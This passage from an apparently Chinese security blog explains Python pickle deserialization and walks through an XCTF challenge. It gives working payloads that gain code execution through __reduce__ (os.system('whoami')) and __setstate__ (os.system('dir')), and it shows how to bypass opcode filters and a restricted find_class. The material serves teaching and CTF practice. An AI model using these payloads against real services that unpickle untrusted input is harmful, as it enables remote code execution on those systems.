STOP</code></pre><p><code>.</code>ï¼šSTOPæŒ‡ä»¤ï¼Œå½“å‰æ ˆé¡¶å…ƒç´ å°±æ˜¯ååºåˆ—åŒ–çš„æœ€ç»ˆç»“æœï¼ŒæŠŠä»–å¼¹å‡º</p><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><h4 id="reduce"><a href="#reduce" class="headerlink" title="__reduce__"></a><code>__reduce__</code></h4><p><code>__reduce__</code>çš„æŒ‡ä»¤ç ä¸º<code>R</code>ï¼Œä»–åœ¨ååºåˆ—åŒ–çš„æ—¶å€™å¹²äº†è¿™ä¹ˆä¸€ä»¶äº‹</p><ul><li>å–å½“å‰æ ˆçš„æ ˆé¡¶è®°ä¸º<code>args</code>ï¼Œç„¶åæŠŠå®ƒå¼¹æ‰ã€‚</li><li>å–å½“å‰æ ˆçš„æ ˆé¡¶è®°ä¸º<code>f</code>ï¼Œç„¶åæŠŠå®ƒå¼¹æ‰ã€‚</li><li>ä»¥<code>args</code>ä¸ºå‚æ•°ï¼Œæ‰§è¡Œå‡½æ•°<code>f</code>ï¼ŒæŠŠç»“æœå‹è¿›å½“å‰æ ˆã€‚</li></ul><p>classçš„<code>__reduce__</code>æ–¹æ³•åœ¨pickleååºåˆ—åŒ–çš„æ—¶å€™ä¼šè¢«æ‰§è¡Œï¼ˆç±»ä¼¼phpä¸­çš„<code>__wakeup</code>ï¼‰ï¼Œå…¶åº•å±‚çš„ç¼–ç æ–¹æ³•å°±æ˜¯åˆ©ç”¨äº†RæŒ‡ä»¤ï¼Œfè¦ä¹ˆè¿”å›å­—ç¬¦ä¸²ï¼Œè¦ä¹ˆè¿”å›ä¸€ä¸ªtupleï¼Œåè€…å°±å¯ä»¥è¿›è¡Œåˆ©ç”¨ï¼Œpayloadå¦‚ä¸‹ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> pickletools<span class="token keyword">import</span> os<span class="token keyword">class</span> <span class="token class-name">dairy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>date <span class="token operator">=</span> <span class="token number">20202020</span>        self<span class="token punctuation">.</span>text <span class="token operator">=</span> <span class="token string">'è¯­è¨€'</span>        self<span class="token punctuation">.</span>tode <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'è®¡'</span><span class="token punctuation">,</span><span class="token string">'ç®—'</span><span class="token punctuation">,</span><span class="token string">'æœº'</span><span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>                      <span class="token comment">#ååºåˆ—åŒ–æ—¶æ‰§è¡Œï¼Œåº•å±‚ç¼–ç æ–¹æ³•ä½¿ç”¨RæŒ‡ä»¤ç ï¼Œ</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>today <span class="token operator">=</span> dairy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#print(pickle.dumps(today))</span>x <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>today<span class="token punctuation">)</span>x <span class="token operator">=</span> pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>x<span class="token punctuation">)</span>  <span class="token comment">#ä¼˜åŒ–ï¼Œæ¶ˆé™¤æœªä½¿ç”¨çš„PUT</span>pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>x<span class="token punctuation">)</span>           <span class="token comment">#åæ±‡ç¼–ä¸€ä¸ªå·²ç»æ‰“åŒ…çš„å­—ç¬¦ä¸²ï¼Œä¼˜åŒ–ä¸€ä¸ªå·²ç»è¢«æ‰“åŒ…çš„å­—ç¬¦ä¸²</span></code></pre><p>å¾—åˆ°ä»¥ä¸‹ç»“æœ</p><pre class="language-shell" data-language="shell"><code class="language-shell">b<span class="token string">'\x80\x03cnt\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.'</span>    <span class="token number">0</span>: <span class="token punctuation">\</span>x80 PROTO      <span class="token number">3</span>    <span class="token number">2</span>: c    GLOBAL     <span class="token string">'nt system'</span>   <span class="token number">13</span>: X    BINUNICODE <span class="token string">'whoami'</span>   <span class="token number">24</span>: <span class="token punctuation">\</span>x85 TUPLE1   <span class="token number">25</span>: R    REDUCE   <span class="token number">26</span>: <span class="token builtin class-name">.</span>    STOPhighest protocol among opcodes <span class="token operator">=</span> <span class="token number">2</span></code></pre><p>éšåå°†åºåˆ—åŒ–çš„å†…å®¹ååºåˆ—åŒ–</p><pre class="language-python" data-language="python"><code class="language-python">b <span class="token operator">=</span> <span class="token string">b'\x80\x03cnt\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.'</span>hack <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>b<span class="token punctuation">)</span></code></pre><p>éšåå°±å¯å¾—åˆ°å‘½ä»¤æ‰§è¡Œçš„ç»“æœ</p><h4 id="cæŒ‡ä»¤ç "><a href="#cæŒ‡ä»¤ç " class="headerlink" title="cæŒ‡ä»¤ç "></a>cæŒ‡ä»¤ç </h4><p>å…ˆæ¥çœ‹ä¸‹é¢ä¸€æ®µä»£ç ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> base64<span class="token keyword">class</span> <span class="token class-name">student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>grade<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>grade <span class="token operator">=</span> grade    <span class="token keyword">def</span> <span class="token function">__eq__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>other<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token comment"># å®šä¹‰å†…ç½®æ–¹æ³•,å½“åˆ¤æ–­ä¸¤ä¸ªå¯¹è±¡çš„å€¼æ˜¯å¦ç›¸ç­‰æ—¶ï¼Œè§¦å‘æ­¤æ–¹æ³•</span>        <span class="token keyword">return</span> <span class="token builtin">type</span><span class="token punctuation">(</span>other<span class="token punctuation">)</span> <span class="token keyword">is</span> student <span class="token keyword">and</span> self<span class="token punctuation">.</span>name <span class="token operator">==</span> other<span class="token punctuation">.</span>name <span class="token keyword">and</span> self<span class="token punctuation">.</span>grade <span class="token operator">==</span> other<span class="token punctuation">.</span>grade        <span class="token comment">#isæ¯”è¾ƒåœ°å€</span><span class="token keyword">print</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>student<span class="token punctuation">(</span><span class="token string">'czj'</span><span class="token punctuation">,</span><span class="token string">'extrader'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">import</span> blue<span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'R'</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'no reduce!'</span>    x <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>x <span class="token operator">!=</span> student<span class="token punctuation">(</span>blue<span class="token punctuation">.</span>name<span class="token punctuation">,</span>blue<span class="token punctuation">.</span>grade<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Not equal >_&lt;'</span>    <span class="token keyword">return</span> <span class="token string">'well done!'</span><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>check<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span></code></pre><p><code>blue.py</code>ä¸­ï¼š</p><pre class="language-python" data-language="python"><code class="language-python">name <span class="token operator">=</span> <span class="token string">"A"</span>grade <span class="token operator">=</span> <span class="token string">"B"</span></code></pre><p>ä»¥ä¸Šä»£ç è¿‡æ»¤äº†<code>R</code>æŒ‡ä»¤ç ï¼Œ<code>check</code>æ–¹æ³•ä¸­æ£€æµ‹åˆ°<code>input</code>çš„<code>date</code>ä¸­å«æœ‰<code>R</code>æŒ‡ä»¤ç å°±ç›´æ¥è¢«è¿”å›<code>no reduce!</code>ï¼Œå‡½æ•°ç»™å‡ºäº†ä¸€ä¸ªè¾“å…¥ç‚¹ï¼Œåœ¨å°†<code>input</code>çš„<code>data</code>å‚æ•°ååºåˆ—åŒ–åéœ€è¦å…¶ä¸­çš„nameå’Œgradeå’Œblueè¿™ä¸ªmoduleä¸­çš„nameå’Œgradeç›¸å¯¹åº”ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬éœ€è¦åˆ©ç”¨åºåˆ—åŒ–åçš„studentç±»ï¼Œæ¥ä»¤å…¶ç›¸ç­‰</p><p>è¿™é‡Œå¦‚æœæˆ‘ä»¬çŸ¥é“blue.pyä¸­å‚æ•°çš„å€¼çš„è¯ï¼Œç›´æ¥æ„é€ <code>name = &quot;A&quot;</code>ï¼Œ<code>grade = &quot;B&quot;</code>çš„payloadå³å¯ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200406174320049.png" alt loading="lazy"></p><p>ä½†æ˜¯åœ¨æˆ‘ä»¬ä¸çŸ¥é“blue.pyçš„å‰æä¸‹å¦‚ä½•ç»•è¿‡å‘¢ï¼Ÿè¿™é‡Œå°±è¦ç”¨åˆ°æˆ‘ä»¬çš„cæŒ‡ä»¤ç äº†</p><p>cæŒ‡ä»¤ç æ˜¯ä¸“é—¨ç”¨æ¥è·å–ä¸€ä¸ªå…¨å±€å˜é‡çš„</p><p>å…ˆçœ‹ä¸€ä¸‹åæ±‡ç¼–åè¾“å‡ºçš„æ•ˆæœ</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200406174942602.png" alt loading="lazy"></p><p>åˆ©ç”¨cæŒ‡ä»¤æ›¿æ¢æ‰<code>czj</code>å’Œ<code>extrader</code>ä¸­ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œå°†<code>pickle.dumps</code>åçš„<code>bytes</code>å­—ç¬¦ä¸²ä¸­çš„<code>X\x03\x00\x00\x00czj</code>æ›¿æ¢æˆ<code>cblue\nname\n</code>ï¼Œ<code>X\x08\x00\x00\x00extrader</code>æ›¿æ¢æˆ<code>cblue\ngrade\n</code>éšåbase64ç¼–ç åè§‚å¯Ÿæ•ˆæœï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200406180134773.png" alt loading="lazy"></p><p>å¯ä»¥æ¸…æ¥šçš„çœ‹åˆ°cæŒ‡ä»¤ç æ›¿æ¢æˆåŠŸï¼Œéšåä¹ŸæˆåŠŸçš„ç»•è¿‡äº†æ¯”è¾ƒ</p><p>ä½†å¦‚æœcæŒ‡ä»¤çš„<code>module</code>è¢«é™åˆ¶äº†å‘¢ï¼ŸcæŒ‡ä»¤ï¼ˆä¹Ÿå°±æ˜¯GLOBALæŒ‡ä»¤ï¼‰åŸºäº<code>find_class</code>è¿™ä¸ªæ–¹æ³•ï¼Œç„¶è€Œ<code>find_class</code>å¯ä»¥è¢«é‡å†™ï¼Œå¦‚æœcæŒ‡ä»¤ç åªå…è®¸åŒ…å«<code>__main__</code>è¿™ä¸€ä¸ª<code>module</code>ï¼Œåˆè¯¥å¦‚ä½•è§£å†³ï¼Ÿä»£ç å¦‚ä¸‹</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> base64<span class="token keyword">import</span> pickletools<span class="token keyword">import</span> blue<span class="token keyword">import</span> io<span class="token keyword">import</span> sys<span class="token keyword">class</span> <span class="token class-name">student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>grade<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>grade <span class="token operator">=</span> grade    <span class="token keyword">def</span> <span class="token function">__eq__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>other<span class="token punctuation">)</span><span class="token punctuation">:</span>             <span class="token keyword">return</span> <span class="token builtin">type</span><span class="token punctuation">(</span>other<span class="token punctuation">)</span> <span class="token keyword">is</span> student <span class="token keyword">and</span> self<span class="token punctuation">.</span>name <span class="token operator">==</span> other<span class="token punctuation">.</span>name <span class="token keyword">and</span> self<span class="token punctuation">.</span>grade <span class="token operator">==</span> other<span class="token punctuation">.</span>grade<span class="token keyword">class</span> <span class="token class-name">RestrictedUnpickler</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>Unpickler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">find_class</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> module <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>        <span class="token keyword">raise</span> pickle<span class="token punctuation">.</span>UnpicklingError<span class="token punctuation">(</span><span class="token string">"global '%s.%s' is forbidden"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#é€šè¿‡raiseæ˜¾ç¤ºåœ°å¼•å‘å¼‚å¸¸ã€‚ä¸€æ—¦æ‰§è¡Œäº†raiseè¯­å¥ï¼Œraiseåé¢çš„è¯­å¥å°†ä¸èƒ½æ‰§è¡Œã€‚</span><span class="token keyword">def</span> <span class="token function">restricted_loads</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> RestrictedUnpickler<span class="token punctuation">(</span>io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">'R'</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'no reduce!'</span>        <span class="token keyword">if</span> <span class="token builtin">type</span><span class="token punctuation">(</span>restricted_loads<span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token keyword">not</span> student<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"false!"</span>        x <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>x <span class="token operator">!=</span> student<span class="token punctuation">(</span>blue<span class="token punctuation">.</span>name<span class="token punctuation">,</span>blue<span class="token punctuation">.</span>grade<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'Not equal >_&lt;'</span>        <span class="token keyword">return</span> <span class="token string">'well done!'</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Something wrong"</span><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>check<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span></code></pre><p><code>blue.py</code>ä¸­ï¼š</p><pre class="language-python" data-language="python"><code class="language-python">name <span class="token operator">=</span> <span class="token string">"A"</span>grade <span class="token operator">=</span> <span class="token string">"B"</span></code></pre><p>é¢˜ç›®éƒ¨åˆ†æ¥è‡ªXCTFé«˜æ ¡æˆ˜ç–«çš„ä¸€é“é¢˜ï¼šwebtmp</p><p>è¿™é“é¢˜å°±å°†inputçš„dateçš„modulesè¿›è¡Œäº†åˆ¤æ–­ï¼Œå¦‚æœä¸æ˜¯<code>__main__ student</code>åˆ™ä¼šå¼•å‘é”™è¯¯ç„¶åé€€å‡ºï¼Œé‚£è¯¥å¦‚ä½•è§£å†³ï¼Ÿ</p><p>æˆ‘ä»¬çŸ¥é“ï¼Œé€šè¿‡GLOBALå¼•å…¥çš„å˜é‡ï¼Œå¯ä»¥çœ‹ä½œæ˜¯åŸå˜é‡çš„å¼•ç”¨ï¼Œ<strong>å½“æˆ‘ä»¬åœ¨æ ˆä¸Šä¿®æ”¹å®ƒçš„å€¼</strong>ï¼Œä¼šå¯¼è‡´åŸå˜é‡ä¹Ÿè¢«ä¿®æ”¹ï¼æ€è·¯å¦‚ä¸‹ï¼š</p><ul><li>é€šè¿‡<code>__main__.blue</code>å¼•å…¥è¿™ä¸€ä¸ª<code>module</code>ï¼Œç”±äºå‘½åç©ºé—´è¿˜åœ¨mainå†…ï¼Œæ•…ä¸ä¼šæ‹¦æˆªï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨<code>__main__</code>ä¸Šå†æ–°æ„é€ ä¸€ä¸ªæ¨¡å—ï¼Œç”¨æ¥å¯¹æ•°æ®è¿›è¡Œæ”¹å†™</li><li>æŠŠä¸€ä¸ª<code>dict</code>å‹è¿›æ ˆï¼Œå†…å®¹æ˜¯<code>&#123;&#39;name&#39;:&#39;B&#39;,&#39;grade&#39;:&#39;B&#39;&#125;</code></li><li>æ‰§è¡Œ<code>BUILD</code>æŒ‡ä»¤ï¼Œä¼šæ”¹å†™<code>__main__.blue.name</code>å’Œ<code>__main__.blue.grade</code>ï¼Œåˆ°è¿™é‡Œ<code>blue.name</code>å’Œ<code>blue.grade</code>å·²ç»è¢«ç¯¡æ”¹æˆæˆ‘ä»¬æƒ³è¦çš„å†…å®¹</li><li>å¼¹æ‰æ ˆé¡¶ï¼Œç°åœ¨æ ˆå˜æˆç©ºçš„</li><li>ç…§æŠ„æ­£å¸¸çš„Studentåºåˆ—åŒ–ä¹‹åçš„å­—ç¬¦ä¸²ï¼Œå‹å…¥ä¸€ä¸ªæ­£å¸¸çš„<code>student</code>å¯¹è±¡ï¼Œ<code>name</code>å’Œ<code>grade</code>åˆ†åˆ«æ˜¯<code>&#39;B&#39;</code>å’Œ<code>&#39;B&#39;</code>ç”±äº</li></ul><p>ç”±äºæ ˆé¡¶æ˜¯æ­£å¸¸çš„<code>student</code>å¯¹è±¡ï¼ˆ<code>if</code>è¯­å¥åˆ¤æ–­ç”¨è¿‡ï¼‰ï¼Œ<code>pickle.loads</code>ä¼šè¿”å›æ­£å¸¸ï¼Œäºæ˜¯åˆ°æ‰‹çš„<code>student</code>å¯¹è±¡<code>name</code>å’Œ<code>grade</code>éƒ½ä¸<code>blue.name</code>ã€<code>blue.grade</code>å¯¹åº”äº†</p><p><code>payload</code>å¦‚ä¸‹ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token string">b'\x80\x03c__main__\nblue\n&#125;(Vname\nVB\nVgrade\nVB\nub0c__main__\nstudent\n)\x81&#125;(X\x04\x00\x00\x00nameX\x01\x00\x00\x00BX\x05\x00\x00\x00gradeX\x01\x00\x00\x00Bub.'</span></code></pre><p>å…¶ä¸­qæŒ‡ä»¤å¯çœç•¥</p><p>æŠŠè¿‡ç¨‹è¾“å‡ºæ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200406221611185.png" alt loading="lazy"></p><p>å¯çœ‹åˆ°æˆåŠŸç»•è¿‡äº†åˆ¤æ–­</p><h4 id="setstate"><a href="#setstate" class="headerlink" title="setstate"></a>setstate</h4><p>å¦‚æœ<code>inst</code>æœ‰<code>__setstate__</code>æ–¹æ³•ï¼Œåˆ™æŠŠ<code>state</code>äº¤ç»™<code>__setstate__</code>æ–¹æ³•æ¥å¤„ç†ï¼Œå¦åˆ™çš„è¯ï¼Œç›´æ¥æŠŠ<code>state</code>è¿™ä¸ª<code>dist</code>çš„å†…å®¹ï¼Œåˆå¹¶åˆ°<code>inst.__dict__</code>é‡Œé¢</p><p><code>__setstate__</code>ä¸<code>__getstate__</code>çš„å…³ç³»ï¼š<code>pickle</code>ä¸€ä¸ªç±»çš„å®ä¾‹æ—¶ï¼ŒPython å°†åª <code>pickle</code> å½“å®ƒè°ƒç”¨è¯¥å®ä¾‹çš„ <code>getstate()</code> æ–¹æ³•æ—¶è¿”å›ç»™å®ƒçš„å€¼ã€‚ç±»ä¼¼çš„ï¼Œåœ¨ <code>unpickle</code> æ—¶ï¼ŒPython å°†æä¾›ç»è¿‡ <code>unpickle</code> çš„å€¼ä½œä¸ºå‚æ•°ä¼ é€’ç»™å®ä¾‹çš„ <code>setstate()</code> æ–¹æ³•ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> pickletools<span class="token keyword">class</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>     self<span class="token punctuation">.</span>val <span class="token operator">=</span> <span class="token number">2020</span>  <span class="token keyword">def</span> <span class="token function">__getstate__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"I'm being pickled"</span><span class="token punctuation">)</span>     self<span class="token punctuation">.</span>val <span class="token operator">*=</span> <span class="token number">2</span>     <span class="token keyword">return</span> self<span class="token punctuation">.</span>__dict__  <span class="token keyword">def</span> <span class="token function">__setstate__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"I'm being unpickled with these values:&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span>      self<span class="token punctuation">.</span>__dict__ <span class="token operator">=</span> d     self<span class="token punctuation">.</span>val <span class="token operator">*=</span> <span class="token number">3</span>f <span class="token operator">=</span> Foo<span class="token punctuation">(</span><span class="token punctuation">)</span>f_string <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>f_string<span class="token punctuation">)</span>a <span class="token operator">=</span> pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>f_string<span class="token punctuation">)</span>pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>a<span class="token punctuation">)</span>f_new <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>f_string<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>f_new<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>ä»£ç æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200407095734164.png" alt loading="lazy"></p><p>å¯çœ‹åˆ°<code>pickle</code>æ—¶æ‰§è¡Œäº†<code>__getstate__</code>æ–¹æ³•ï¼Œ<code>unpickle</code>æ—¶æ‰§è¡Œäº†<code>__setstate__</code>æ–¹æ³•ï¼Œä¸”ä½¿ç”¨äº†<code>__getstate__</code>æ–¹æ³•è¿”å›çš„å€¼</p><p>å¦‚æœå½“åŸå¯¹è±¡æ²¡æœ‰<code>__setstate__</code>è¿™ä¸ªæ–¹æ³•çš„æ—¶å€™ï¼Œå¦‚æœæˆ‘ä»¬æ„é€ äº†ä¸€ä¸ª<code>&#123;&#39;__setstate__&#39;: os.system&#125;</code>æ¥<code>BUILD</code>è¿™ä¸ªå¯¹è±¡ï¼Œå°±ä¼šé€ æˆä»»æ„ä»£ç æ‰§è¡Œï¼Œç°åœ¨å¯¹è±¡çš„<code>__setstate__</code>å°±å˜æˆäº†</p><p><code>os.system</code>ï¼Œæ¥ä¸‹æ¥å†æ¬¡åˆ©ç”¨<code>dir</code>æ¥<code>BUILD</code>è¿™ä¸ªå¯¹è±¡ï¼Œå°±æ„æˆäº†<code>os.system(&#39;dir&#39;)</code>å‘½ä»¤æ‰§è¡Œï¼Œå®ç°äº†RCE</p><p><code>payload</code>ï¼š<code>b&#39;\x80\x03c__main__\nFoo\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVdir\nb.&#39;</code></p><p>æœ‰å¦‚ä¸‹ä»£ç ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> pickletools<span class="token keyword">class</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>     self<span class="token punctuation">.</span>val <span class="token operator">=</span> <span class="token number">2020</span>  <span class="token keyword">def</span> <span class="token function">__getstate__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"I'm being pickled"</span><span class="token punctuation">)</span>     self<span class="token punctuation">.</span>val <span class="token operator">*=</span> <span class="token number">2</span>     <span class="token keyword">return</span> self<span class="token punctuation">.</span>__dict__f <span class="token operator">=</span> Foo<span class="token punctuation">(</span><span class="token punctuation">)</span>f_string <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>f_string<span class="token punctuation">)</span>a <span class="token operator">=</span> pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>f_string<span class="token punctuation">)</span>pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>a<span class="token punctuation">)</span>f_new <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>f_string<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>f_new<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">)</span>d <span class="token operator">=</span> <span class="token string">b'\x80\x03c__main__\nFoo\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVdir\nb.'</span>c <span class="token operator">=</span> pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>d<span class="token punctuation">)</span>pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>c<span class="token punctuation">)</span>pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>c<span class="token 